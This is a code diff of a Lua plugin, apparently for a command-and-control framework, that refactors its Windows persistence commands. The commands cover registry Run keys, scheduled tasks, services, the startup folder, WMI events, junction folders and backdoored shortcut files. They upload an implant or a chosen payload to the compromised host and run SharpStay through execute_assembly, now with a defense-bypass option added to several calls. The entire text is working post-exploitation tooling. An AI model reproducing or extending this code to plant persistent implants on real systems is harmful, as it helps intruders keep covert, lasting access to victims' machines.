@@ -27,15 +27,38 @@ local persistdefaults = {
     shellcodeformat = "base64"
 }
 
+-- Resolve custom file content from flags: --artifact_name, --use_malefic_as_custom_file, or --custom_file
+local function resolve_custom_file(cmd, session)
+    local artifact_name = cmd:Flags():GetString("artifact_name")
+    local use_malefic_as_custom_file = cmd:Flags():GetBool("use_malefic_as_custom_file")
+    local custom_file = cmd:Flags():GetString("custom_file")
+
+    if artifact_name ~= "" then
+        return artifact_bin(session, artifact_name)
+    elseif use_malefic_as_custom_file then
+        return self_artifact(session)
+    elseif custom_file ~= "" then
+        return read(custom_file)
+    else
+        error("must specify --artifact_name, --custom_file, or --use_malefic_as_custom_file")
+        return nil
+    end
+end
+
+-- Add common custom file flags to a command
+local function add_custom_file_flags(cmd)
+    cmd:Flags():String("artifact_name", "", "artifact name to use as payload (tab-complete supported)")
+    cmd:Flags():String("custom_file", "", "local file path to use as payload")
+    cmd:Flags():Bool("use_malefic_as_custom_file", false, "use current session's artifact as payload")
+    bind_flags_completer(cmd, { artifact_name = artifact_name_completer() })
+end
+
 local function run_Registry_Key(cmd, args)
-    local regkeyname, command, drop_location, custom_file, custom_file_content,
+    local regkeyname, command, drop_location, custom_file_content,
           template, registry_key, clean_up
     local reg_key_name = cmd:Flags():GetString("reg_key_name")
     local command = cmd:Flags():GetString("command")
     local drop_location = cmd:Flags():GetString("drop_location")
-    local use_malefic_as_custom_file = cmd:Flags():GetBool(
-                                           "use_malefic_as_custom_file")
-    local custom_file = cmd:Flags():GetString("custom_file")
     local registry_key = cmd:Flags():GetString("registry_key")
     local session = active()
 
@@ -45,22 +68,10 @@ local function run_Registry_Key(cmd, args)
         regkeyname = persistdefaults.regkeyname
     end
 
-    if use_malefic_as_custom_file and custom_file ~= "" then
-        error("Cannot use both custom file and use_malefic_as_custom_file")
-        return
-    end
-
     if drop_location == "" then drop_location = persistdefaults.droplocation end
 
-    local custom_file_content
-    if use_malefic_as_custom_file then
-        custom_file_content = self_artifact(session)
-    elseif custom_file ~= "" then
-        custom_file_content = read(custom_file)
-    else
-        error("must specify --custom_file or --use_malefic_as_custom_file")
-        return
-    end
+    local custom_file_content = resolve_custom_file(cmd, session)
+    if custom_file_content == nil then return end
 
     if command == "" then
         if drop_location ~= "" then
@@ -92,42 +103,24 @@ cmd_registry_key:Flags():String("command", "",
                                 "Command to execute via the registry key")
 cmd_registry_key:Flags():String("drop_location", persistdefaults.droplocation,
                                 "File path where payload is dropped")
-cmd_registry_key:Flags():Bool("use_malefic_as_custom_file", false,
-                              "Use Malefic file as custom payload")
-cmd_registry_key:Flags():String("custom_file", persistdefaults.customfile,
-                                "custom_file")
 cmd_registry_key:Flags():String("registry_key", persistdefaults.registry_key,
                                 "Full registry key path (e.g., HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run)")
+add_custom_file_flags(cmd_registry_key)
 -- cmd_registry_key:Flags():Bool("clean_up", false, "clean_up")
 
 function run_scheduled_task(cmd, args)
     local taskname = cmd:Flags():GetString("taskname")
     local command = cmd:Flags():GetString("command")
-    local custom_file = cmd:Flags():GetString("custom_file")
     local drop_location = cmd:Flags():GetString("drop_location")
-    local use_malefic_as_custom_file = cmd:Flags():GetBool(
-                                           "use_malefic_as_custom_file")
     local trigger = cmd:Flags():GetInt("trigger")
     local session = active()
 
     taskname = taskname ~= "" and taskname or persistdefaults.taskname
 
-    if use_malefic_as_custom_file and custom_file ~= "" then
-        error("Cannot use both custom file and use_malefic_as_custom_file")
-        return
-    end
-
     if drop_location == "" then drop_location = persistdefaults.droplocation end
 
-    local custom_file_content
-    if use_malefic_as_custom_file then
-        custom_file_content = self_artifact(session)
-    elseif custom_file ~= "" then
-        custom_file_content = read(custom_file)
-    else
-        error("must specify --custom_file or --use_malefic_as_custom_file")
-        return
-    end
+    local custom_file_content = resolve_custom_file(cmd, session)
+    if custom_file_content == nil then return end
 
     if command == "" then
         if drop_location ~= "" then
@@ -155,27 +148,16 @@ cmd_scheduled_task:Flags():String("command", persistdefaults.command,
 cmd_scheduled_task:Flags():Int("trigger", 9, "trigger")
 cmd_scheduled_task:Flags():String("drop_location", persistdefaults.droplocation,
                                   "File path where payload is dropped")
-cmd_scheduled_task:Flags():Bool("use_malefic_as_custom_file", false,
-                                "Use Malefic file as custom payload")
-cmd_scheduled_task:Flags():String("custom_file", "",
-                                  "custom_file which will be uploaded")
+add_custom_file_flags(cmd_scheduled_task)
 
 local function run_service_install(cmd, args)
     local session = active()
     local service_name = cmd:Flags():GetString("service_name")
     local display_name = cmd:Flags():GetString("display_name")
-    local custom_file = cmd:Flags():GetString("custom_file")
     local drop_location = cmd:Flags():GetString("drop_location")
-    local use_malefic_as_custom_file = cmd:Flags():GetBool(
-                                           "use_malefic_as_custom_file")
     local start_type = cmd:Flags():GetString("start_type")
     local error_control = cmd:Flags():GetString("error_control")
     local account_name = cmd:Flags():GetString("account_name")
-
-    if use_malefic_as_custom_file and custom_file ~= "" then
-        error("Cannot use both --custom_file and --use_malefic_as_custom_file")
-        return
-    end
 
     service_name = service_name ~= "" and service_name or
                        persistdefaults.servicename
@@ -184,15 +166,8 @@ local function run_service_install(cmd, args)
 
     if drop_location == "" then drop_location = persistdefaults.droplocation end
 
-    local custom_file_content
-    if use_malefic_as_custom_file then
-        custom_file_content = self_artifact(session)
-    elseif custom_file ~= "" then
-        custom_file_content = read(custom_file)
-    else
-        error("must specify --custom_file or --use_malefic_as_custom_file")
-        return
-    end
+    local custom_file_content = resolve_custom_file(cmd, session)
+    if custom_file_content == nil then return end
 
     if drop_location ~= "" then
         uploadraw(session, custom_file_content, drop_location, "0644", false)
@@ -218,28 +193,17 @@ cmd_service_install:Flags():String("account_name", "LocalSystem",
 cmd_service_install:Flags():String("drop_location",
                                    persistdefaults.droplocation,
                                    "File path where payload is dropped")
-cmd_service_install:Flags():String("custom_file", "",
-                                   "custom_file which will be uploaded")
-cmd_service_install:Flags():Bool("use_malefic_as_custom_file", false,
-                                 "use_malefic_as_custom_file")
+add_custom_file_flags(cmd_service_install)
 cmd_service_install:Flags():String("command", persistdefaults.command,
                                    "Command to execute via the registry key")
 
 local function run_startup_folder(cmd, args)
     local use_current_user = cmd:Flags():GetString(
                                  "use_current_user_startupfolder")
-    local use_malefic_as_custom_file = cmd:Flags():GetBool(
-                                           "use_malefic_as_custom_file")
-    local custom_file = cmd:Flags():GetString("custom_file")
     local filename = cmd:Flags():GetString("filename")
     local session = active()
     local username = session.Os.Username
     local drop_location
-
-    if use_malefic_as_custom_file and custom_file ~= "" then
-        error("Cannot use both --custom_file and --use_malefic_as_custom_file")
-        return
-    end
 
     if use_current_user then
         drop_location = "C:\\Users\\" .. username ..
@@ -251,15 +215,8 @@ local function run_startup_folder(cmd, args)
                 filename
     end
 
-    local custom_file_content
-    if use_malefic_as_custom_file then
-        custom_file_content = self_artifact(session)
-    elseif custom_file ~= "" then
-        custom_file_content = read(custom_file)
-    else
-        error("must specify --custom_file or --use_malefic_as_custom_file")
-        return
-    end
+    local custom_file_content = resolve_custom_file(cmd, session)
+    if custom_file_content == nil then return end
 
     if drop_location ~= "" then
         uploadraw(session, custom_file_content, drop_location, "0644", false)
@@ -273,39 +230,21 @@ cmd_startup_folder:Flags():Bool("use_current_user_startupfolder", true,
                                 "use_current_user_startupfolder")
 cmd_startup_folder:Flags():String("filename", "Stay.exe",
                                   "filename of executable file to be run at startup.")
-cmd_startup_folder:Flags():String("custom_file", "",
-                                  "custom_file which will be uploaded")
-cmd_startup_folder:Flags():Bool("use_malefic_as_custom_file", false,
-                                "use_malefic_as_custom_file")
+add_custom_file_flags(cmd_startup_folder)
 
 local function run_wmi_event(cmd, args)
     local session = active()
     local eventname = cmd:Flags():GetString("eventname")
     local command = cmd:Flags():GetString("command")
     local attime = cmd:Flags():GetString("attime")
-    local custom_file = cmd:Flags():GetString("custom_file")
     local drop_location = cmd:Flags():GetString("drop_location")
-    local use_malefic_as_custom_file = cmd:Flags():GetBool(
-                                           "use_malefic_as_custom_file")
-
-    if use_malefic_as_custom_file and custom_file ~= "" then
-        error("Cannot use both --custom_file and --use_malefic_as_custom_file")
-        return
-    end
 
     eventname = eventname ~= "" and eventname or persistdefaults.eventname
 
     if drop_location == "" then drop_location = persistdefaults.droplocation end
 
-    local custom_file_content
-    if use_malefic_as_custom_file then
-        custom_file_content = self_artifact(session)
-    elseif custom_file ~= "" then
-        custom_file_content = read(custom_file)
-    else
-        error("must specify --custom_file or --use_malefic_as_custom_file")
-        return
-    end
+    local custom_file_content = resolve_custom_file(cmd, session)
+    if custom_file_content == nil then return end
 
     if command == "" then
         if drop_location ~= "" then
@@ -326,7 +265,7 @@ local function run_wmi_event(cmd, args)
         "command=" .. command
     }
     return execute_assembly(session, script_resource(sharpstay), sharp_args,
-                            true, new_sac())
+                            true, new_bypass_all(), new_sac())
 end
 
 local cmd_wmi_event = command("persistence:WMI_Event", run_wmi_event,
@@ -335,41 +274,23 @@ cmd_wmi_event:Flags()
     :String("eventname", persistdefaults.eventname, "eventname")
 cmd_wmi_event:Flags():String("command", "", "Command to execute")
 cmd_wmi_event:Flags():String("attime", "startup", "At Time: ")
-cmd_wmi_event:Flags():String("custom_file", "",
-                             "custom_file which will be uploaded")
 cmd_wmi_event:Flags():String("drop_location", persistdefaults.droplocation,
                              "File path where payload is dropped")
-cmd_wmi_event:Flags():Bool("use_malefic_as_custom_file", false,
-                           "use_malefic_as_custom_file")
+add_custom_file_flags(cmd_wmi_event)
 
 local function run_JunctionFolder(cmd, args)
     local session = active()
     local dllpath = cmd:Flags():GetString("dllpath")
     local guid = cmd:Flags():GetString("guid")
     local drop_location = cmd:Flags():GetString("drop_location")
-    local custom_file = cmd:Flags():GetString("custom_file")
-    local use_malefic_as_custom_file = cmd:Flags():GetBool(
-                                           "use_malefic_as_custom_file")
-
-    if use_malefic_as_custom_file and custom_file ~= "" then
-        error("Cannot use both --custom_file and --use_malefic_as_custom_file")
-        return
-    end
 
     dllpath = dllpath ~= "" and dllpath or "C:\\windows\\system32\\ntdll.dll"
     guid = guid ~= "" and guid or "8d1c5b23-6907-4d3d-9da2-920b54d0753c"
 
     if drop_location == "" then drop_location = persistdefaults.droplocation end
 
-    local custom_file_content
-    if use_malefic_as_custom_file then
-        custom_file_content = self_artifact(session)
-    elseif custom_file ~= "" then
-        custom_file_content = read(custom_file)
-    else
-        error("must specify --custom_file or --use_malefic_as_custom_file")
-        return
-    end
+    local custom_file_content = resolve_custom_file(cmd, session)
+    if custom_file_content == nil then return end
 
     if drop_location ~= "" then
         uploadraw(session, custom_file_content, drop_location, "0644", false)
@@ -381,7 +302,7 @@ local function run_JunctionFolder(cmd, args)
 
     local sharpstay = "StayKit/SharpStay.exe"
     return execute_assembly(session, script_resource(sharpstay), sharp_args,
-                            true, false, false)
+                            true, new_bypass_all(), new_sac())
 end
 
 local cmd_junction_folder = command("persistence:Junction_Folder",
@@ -389,9 +310,7 @@ local cmd_junction_folder = command("persistence:Junction_Folder",
 cmd_junction_folder:Flags():String("dllpath", "", "dllpath")
 cmd_junction_folder:Flags():String("guid", "", "guid")
 cmd_junction_folder:Flags():String("drop_location", "", "drop_location")
-cmd_junction_folder:Flags():String("custom_file", "", "custom_file")
-cmd_junction_folder:Flags():Bool("use_malefic_as_custom_file", false,
-                                 "use_malefic_as_custom_file")
+add_custom_file_flags(cmd_junction_folder)
 
 local function run_newlnk(cmd, args)
     local session = active()
@@ -401,26 +320,11 @@ local function run_newlnk(cmd, args)
     local lnkicon = cmd:Flags():GetString("lnkicon")
     local command = cmd:Flags():GetString("command")
     local drop_location = cmd:Flags():GetString("drop_location")
-    local custom_file = cmd:Flags():GetString("custom_file")
-    local use_malefic_as_custom_file = cmd:Flags():GetBool(
-                                           "use_malefic_as_custom_file")
-
-    if use_malefic_as_custom_file and custom_file ~= "" then
-        error("Cannot use both custom file and use_malefic_as_custom_file")
-        return
-    end
 
     if drop_location == "" then drop_location = persistdefaults.droplocation end
 
-    local custom_file_content
-    if use_malefic_as_custom_file then
-        custom_file_content = self_artifact(session)
-    elseif custom_file ~= "" then
-        custom_file_content = read(custom_file)
-    else
-        error("must specify --custom_file or --use_malefic_as_custom_file")
-        return
-    end
+    local custom_file_content = resolve_custom_file(cmd, session)
+    if custom_file_content == nil then return end
 
     if command == "" then
         if drop_location ~= "" then
@@ -443,7 +347,7 @@ local function run_newlnk(cmd, args)
 
     local file_path = "StayKit/SharpStay.exe"
     return execute_assembly(session, script_resource(file_path), sharp_args,
-                            true, new_sac())
+                            true, new_bypass_all(), new_sac())
 end
 
 local cmd_newlnk = command("persistence:NewLnk", run_newlnk, "persistence",
@@ -454,18 +358,13 @@ cmd_newlnk:Flags():String("lnktarget", "", "lnktarget")
 cmd_newlnk:Flags():String("lnkicon", "", "lnkicon")
 cmd_newlnk:Flags():String("command", "", "command")
 cmd_newlnk:Flags():String("drop_location", "", "drop_location")
-cmd_newlnk:Flags():String("custom_file", "", "custom_file")
-cmd_newlnk:Flags():Bool("use_malefic_as_custom_file", false,
-                        "use_malefic_as_custom_file")
+add_custom_file_flags(cmd_newlnk)
 
 local function run_backdoorlnk(cmd, args)
     local session = active()
     local lnkpath = cmd:Flags():GetString("lnkpath")
     local command = cmd:Flags():GetString("command")
     local drop_location = cmd:Flags():GetString("drop_location")
-    local custom_file = cmd:Flags():GetString("custom_file")
-    local use_malefic_as_custom_file = cmd:Flags():GetBool(
-                                           "use_malefic_as_custom_file")
 
     if lnkpath == "" then
         -- lnkpath = "C:\\users\\" .. session.Os.Username .. "\\desktop\\Excel.lnk"
@@ -473,22 +372,10 @@ local function run_backdoorlnk(cmd, args)
         return
     end
 
-    if use_malefic_as_custom_file and custom_file ~= "" then
-        error("Cannot use both custom file and use_malefic_as_custom_file")
-        return
-    end
-
     if drop_location == "" then drop_location = persistdefaults.droplocation end
 
-    local custom_file_content
-    if use_malefic_as_custom_file then
-        custom_file_content = self_artifact(session)
-    elseif custom_file ~= "" then
-        custom_file_content = read(custom_file)
-    else
-        error("must specify --custom_file or --use_malefic_as_custom_file")
-        return
-    end
+    local custom_file_content = resolve_custom_file(cmd, session)
+    if custom_file_content == nil then return end
 
     if command == "" then
         if drop_location ~= "" then
@@ -507,7 +394,7 @@ local function run_backdoorlnk(cmd, args)
     }
     local file_path = "StayKit/SharpStay.exe"
     return execute_assembly(session, script_resource(file_path), sharp_args,
-                            true, new_sac())
+                            true, new_bypass_all(), new_sac())
 end
 
 local cmd_backdoorlnk = command("persistence:BackdoorLnk", run_backdoorlnk,
@@ -518,10 +405,7 @@ cmd_backdoorlnk:Flags():String("command", "",
                                "The new command to be set for the .lnk file.")
 cmd_backdoorlnk:Flags():String("drop_location", "",
                                "File path where payload is dropped")
-cmd_backdoorlnk:Flags():String("custom_file", "",
-                               "custom_file which will be uploaded")
-cmd_backdoorlnk:Flags():Bool("use_malefic_as_custom_file", false,
-                             "use_malefic_as_custom_file")
+add_custom_file_flags(cmd_backdoorlnk)
 
 -- registry_key
 local function run_regkey_autorun(cmd)
